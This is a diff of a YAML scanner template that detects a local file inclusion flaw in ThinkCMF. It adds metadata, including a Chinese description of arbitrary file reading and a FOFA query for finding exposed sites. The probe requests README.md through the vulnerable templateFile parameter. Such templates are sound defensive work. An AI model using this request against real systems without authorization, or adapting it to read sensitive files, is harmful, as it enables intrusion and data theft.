@@ -1,14 +1,20 @@
 id: thinkcmf-lfi
 
 info:
-    name: Thinkcmf lfi
-    author: JerryKing
-    severity: high
+  name: Thinkcmf lfi
+  author: JerryKing
+  severity: high
+  verified: false
+  description: |
+    Thinkcmf 存在本地文件包含漏洞，攻击者可利用漏洞读取服务器上的任意文件。
+    fofa: title=="ThinkCMF"
+  tags: thinkcmf,lfi
+  created: 2025/10/27
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /?a=display&templateFile=README.md
-        expression: response.status == 200 && response.body.bcontains(bytes(string(b"ThinkCMF"))) && response.body.bcontains(bytes(string(b"## README")))
+  r0:
+    request:
+      method: GET
+      path: /?a=display&templateFile=README.md
+    expression: response.status == 200 && response.body.bcontains(b"ThinkCMF") && response.body.bcontains(b"## README")
 expression: r0()
